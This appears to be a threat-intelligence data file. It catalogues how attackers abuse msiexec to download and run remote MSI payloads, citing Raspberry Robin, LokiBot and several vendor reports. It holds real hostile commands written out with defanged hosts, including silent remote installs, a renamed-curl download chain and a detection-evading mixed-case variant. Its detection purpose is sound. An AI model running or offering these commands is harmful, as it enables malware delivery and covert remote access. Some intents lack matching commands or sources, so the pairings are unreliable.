associated_malware.name: Raspberry Robin
associated_malware.description: Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution. Raspberry Robin retrieves its second stage payload in a variety of ways such as through msiexec.exe abuse, or running the curl command to download the payload to the victim's %AppData% folder.

associated_commands.intent: After the Office equation editor exploit runs, the command downloads an installer package (.msi) and installs it; the package drops the backdoor installer UserInstall.exe.
Exploitation of CVE-2017-11882 leads to download and installation of the malicious MSI package zus.msi through Windows Installer, which delivers LokiBot.
associated_commands.source_name: Trend Micro LokiBot Windows Installer February 2018

associated_commands.intent: A VBScript written by cmd runs msiexec to download and install a second stage payload from the attacker server.
The VBS file written by the macro downloads a second-stage MSI payload from the attacker server and executes it with msiexec.
associated_commands.source_name: Check Point Rancor Year of the Phish September 2019

associated_commands.intent: The secondary VBScript kills running msiexec.exe instances, waits two seconds with ping, then launches the downloaded PlayerVLC.msi with msiexec.
The final command of the document macro downloads and installs the .MSI file, a downloader that retrieves and runs the FlawedAmmyy RAT.
Second-stage payload retrieval command sent through a China Chopper web shell on a compromised Exchange server.
associated_commands.source_name: Rapid7 Exchange Zero-Day Attacker Behavior March 2021

associated_commands.command: cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\Pass.txt & start %APPDATA%\Pass.txt && FOR %i IN (%systemroot%\system32\msiexec.*) DO msiexec -c /Q /i hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd
associated_commands.intent: Run when the victim opens the shortcut file; it opens the decoy password file and uses msiexec to silently launch the fetched Windows Installer file.
After the LNK downloads the MSI with PowerShell and renames it to y.msi, it is installed with msiexec.

associated_commands.command: mSIexeC -Q -IhTtP://NT3[.]XyZ:8080/ [11 char long random string] / [computer name] = [username]
associated_commands.intent: After delivery, cmd.exe spawns msiexec.exe in quiet mode to download the Raspberry Robin payload, with mixed case letters to bypass detection.

associated_commands.command: mSIExec /Q /IhTTP://0Dz[.]Me:8080/ [11 char long random string] / [computer name] = [username]
associated_commands.intent: Another mixed-case variant of the quiet msiexec command used to download the Raspberry Robin payload.
Example staging string observed in UNC3753 remote sessions to download and silently install a SuperOps remote management MSI.
associated_commands.source_name: Google Mandiant UNC3753 US Law Firms June 2026

associated_commands.command: "C:\Windows\System32\cmd.exe" /c cd /d C:\Users\%USERNAME%\AppData\Local\Temp\ & copy c:\windows\system32\curl.exe KFSELqcUm.exe & KFSELqcUm.exe -o qgEYlIKPDYzj.msi https[:]//pittsburgh.soulcarelife[.]org/?sxykn3bjp0rmnaefzc8jb3qc2704 & C:\Windows\System32\msiexec.exe /i qgEYlIKPDYzj.msi /qn
associated_commands.intent: Delivery chain 1: a renamed cURL downloads a Windows Installer package that is executed with msiexec.
Delivery chain 3: Windows Script Host downloads a Windows Installer package that is run with msiexec.
On the compromised SharePoint server, w3wp.exe spawned msiexec.exe to silently download and install a remote MSI payload.

associated_commands.command: C:\windows\system32\msiexec.exe /i hxxps[://www[.tightvnc[.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit[.msi /q /norestart ADDLOCAL=Server SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=[REDACTED]
associated_commands.intent: PsExec was used to run msiexec so that TightVNC was downloaded and installed from a remote location.
The downloaded PIF file only invokes msiexec to download and execute an MSI installer hosted on an attacker-registered web address.
The deobfuscated shortcut command downloads and installs an MSI payload from a remote server.
The macro in the phishing document runs this command; /q makes msiexec run in the background while it downloads and loads an MSI binary.
A second malicious document runs similar msiexec command line artifacts that download an MSI installer from office365onlinehome.com.
